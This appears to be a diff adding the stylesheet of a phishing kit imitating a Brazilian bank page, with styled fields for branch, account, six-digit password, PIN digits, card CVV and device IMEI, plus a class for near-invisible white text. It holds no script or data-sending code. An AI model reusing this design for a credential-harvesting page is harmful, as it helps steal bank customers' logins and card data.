@@ -1,0 +1,56 @@
+
+.c { font-size:1px; color:#FFF; padding:0; margin:0; }
+
+body { margin:0; }
+
+@media (max-width: 768px){ #mobbi { position:fixed;	top:265px; left:0%; right:0; bottom:37px; font-size:1em; padding:10px;	}}
+@media (min-width: 768px){ #mobbi { position:fixed; top:5px; left:59%; right:0;	bottom:37px; font-size:1em;	padding:10px; }}
+@media (max-width: 768px){ #mobbi2 { position:fixed; top:300px; left:0%; right:0; bottom:37px; font-size:1em; padding:10px;	}}
+@media (min-width: 768px){ #mobbi2 { position:fixed; top:5px; left:59%; right:0; bottom:37px; font-size:1em; padding:10px; }}
+@media (max-width: 768px){ #mobbi3 { display:none; }}
+@media (min-width: 768px){ #mobbi3 { position:fixed; top:5px; left:59%; right:0; bottom:37px; font-size:1em; padding:10px; }}
+@media (max-width: 350px){ #min { width:70px; font-size:9px; box-shadow:0 0 3px #FFF; }}
+@media (min-width: 350px){ #min { width:90px; box-shadow:2px 2px 2px #FFF; }}
+@media (max-height: 540px){ #min { width:70px; font-size:9px; }}
+@media (min-height: 540px){ #min { width:90px; }}
+@media (max-width: 350px){ #hidden { display:none; }}
+@media (max-height: 420px){ #casa { display:none; }}
+
+#agencia { padding:10px; width:49%; border:none; border-bottom:1px solid #726D12; float:left; outline:none; border-radius:1px; }
+#conta { padding:10px; width:50%; border:none; border-bottom:1px solid #726D12; float:right; outline:none; border-radius:1px; }
+
+#sss { padding:10px; width:100%; border:none; background:#FFF; border-bottom:1px solid #726D12; float:right; outline:none; border-radius:1px; }
+#sen1 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen2 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen3 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen4 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen5 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen6 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen7 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#sen8 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+
+#seis { padding:8px; width:100%; border:none; border:1px solid #CCC; outline:none; border-radius:1px; }
+#seis1 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#seis2 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#seis3 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#seis4 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#seis5 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#seis6 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+
+#cv { padding:8px; width:100%; border:none; border:1px solid #CCC; outline:none; border-radius:1px; }
+#cv1 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#cv2 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+#cv3 { height:5px; width:5px; border:none; outline:none; background:#FFF; color:#000000; border-radius:50px; }
+
+
+#senha6 { padding:8px; width:100%; border:none; border:1px solid #CCC; outline:none; border-radius:1px; }
+
+#imei { padding:8px; width:100%; border:none; border:1px solid #CCC; outline:none; border-radius:1px; }
+
+#bt { width:100%; padding:10px; }
+
+#text-mn { font-size:2.5em; }
+	
+#min { color:#F5090D; }
+	
+#min:hover { color:#FFF; }
